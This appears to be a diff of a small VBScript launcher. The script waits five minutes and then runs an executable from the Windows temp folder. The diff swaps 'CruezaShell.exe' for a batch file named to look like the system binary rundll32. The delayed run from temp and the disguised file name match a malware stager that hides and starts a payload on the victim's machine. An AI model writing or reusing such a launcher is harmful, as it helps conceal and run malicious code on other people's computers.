@@ -1,4 +1,4 @@
 Dim wshShell
 Set wshShell = CreateObject("WScript.Shell")
 WScript.Sleep(300000)
-wshShell.Run("C:\windows\temp\CruezaShell.exe")
+wshShell.Run("c:\\windows\\temp\\rundll32.bat")
